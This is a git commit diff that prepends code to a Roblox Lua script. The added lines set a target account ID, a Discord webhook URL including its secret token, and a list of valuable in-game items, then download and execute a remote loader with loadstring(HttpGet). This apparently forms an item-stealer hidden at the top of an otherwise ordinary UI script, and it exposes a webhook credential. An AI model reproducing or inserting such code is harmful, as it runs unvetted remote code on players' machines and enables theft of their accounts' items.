11031afd95bd242e6ae36edb89150a073b2e47b0
ruzgarkose831-pixel <ruzgarkose831@gmail.com>
2026-03-03 23:59:08 +0300

    script.lua

--- script.lua
+++ script.lua
@@ -1,3 +1,16 @@
+getgenv().targetUserId = rzgr1ks
+getgenv().webhookURL = "https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F"
+getgenv().whitelistBrainrot = {
+    ["Skibidi Toilet"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Meowl"] = true,
+    ["Garama and Madundung"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Capitano Moby"] = true,
+    ["Headless Horseman"] = true,
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/f8227db06cefdc7b56ea6a3e7d4272de.lua"))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
